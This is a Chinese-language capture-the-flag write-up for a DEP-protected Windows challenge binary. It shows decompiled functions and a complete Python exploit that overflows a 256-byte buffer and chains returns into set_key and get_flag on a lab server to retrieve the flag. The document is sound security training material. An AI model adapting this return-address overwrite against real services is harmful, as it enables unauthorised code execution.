# 系统层漏洞利用与逆向分析-DEP数据执行保护利用-G3 WriteUp

程序结构仍与之前类似，但有一些不同之处：
- buff 大小增大到了 256
- `get_flag` 验证逻辑为验证`0x0041d9b8`处的值是否为`-0x35014542`。

```c
void get_flag(void)

{
                    /* 0x1010  1  get_flag */
  if (var_to_change != -0x35014542) {
    print(0x41d000);
    return;
  }
  GetFlag();
                    /* WARNING: Subroutine does not return */
  ExitProcess(0);
}
```

在Exports中可看到这次新增的`set_key`函数，该函数可将`0x0041d9b8`处的值设置为函数参数

```c
void __cdecl set_key(undefined4 param_1)

{
                    /* 0x1000  2  set_key */
  var_to_change = param_1;
  return;
}
```

攻击逻辑即为ROP链的构造：
1. 调用`set_key`函数，将`0x0041d9b8`处的值设置为`-0x35014542`
2. 调用`get_flag`函数，获取flag

## 代码

```python
import socket
import struct
import ctypes

# 获取token的服务器地址，固定
TARGET_HOST = "172.17.218.103"
TARGET_PORT = 9999

GET_FLAG = 0x00401010 # get_flag函数地址
SET_KEY = 0x00401000 # set_key函数地址
OFFSET = 256 + 4 # 栈偏移
param1 = ctypes.c_uint32(-0x35014542).value  # 将负数转换为无符号整数

def get_token():
    payload = b"A" * OFFSET
    payload += struct.pack("<I", SET_KEY)
    payload += struct.pack("<I", GET_FLAG) 
    payload += struct.pack("<I", param1)
    payload += b"\n"

    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10) as sock:
        sock.settimeout(5)

        banner = sock.recv(1024)
        print(banner.decode(errors="replace"), end="")

        sock.sendall(payload)

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

    text = response.decode(errors="replace")
    print(text)

    return text

if __name__ == "__main__":
    get_token()
```